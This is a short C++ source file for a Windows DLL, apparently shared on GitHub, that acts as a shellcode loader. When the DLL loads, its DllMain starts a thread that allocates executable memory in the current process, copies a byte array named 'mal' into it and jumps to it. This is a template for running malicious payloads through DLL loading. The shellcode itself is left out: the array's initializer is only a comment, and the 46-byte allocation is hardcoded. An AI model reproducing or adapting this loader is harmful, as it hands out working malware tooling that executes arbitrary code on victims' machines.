// By Abdulaziz Almetairy
// Github.com/oh-az


#include "pch.h"
#include <windows.h>

unsigned char mal[] = // Shellcode
unsigned long mal_len = sizeof(mal);



DWORD WINAPI threadFunc(LPVOID lpParameter)
{

	LPVOID allocation;
	HANDLE currentProcess;
	SIZE_T bytesWritten;
	BOOL copyStatus = FALSE;

	// Get the current process handle 
	currentProcess = GetCurrentProcess();

	// Allocate memory with Read+Write+Execute permissions 
	allocation = VirtualAllocEx(currentProcess, NULL, 46, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (allocation == NULL)
		return -1;

	// Copy the shellcode into the memory we just created 
	copyStatus = WriteProcessMemory(currentProcess, allocation, (LPCVOID)&mal, mal_len, &bytesWritten);

	if (!copyStatus)
		return -2;
	((void(*)())allocation)();

	return 1;
}





BOOL WINAPI
DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{

	HANDLE threadHandle;
	HINSTANCE checkDll;

	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		// Create a thread and close the handle as we do not want to use it to wait for it 
		threadHandle = CreateThread(NULL, 0, threadFunc, NULL, 0, NULL);
		CloseHandle(threadHandle);
		break;

	case DLL_PROCESS_DETACH:
		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}

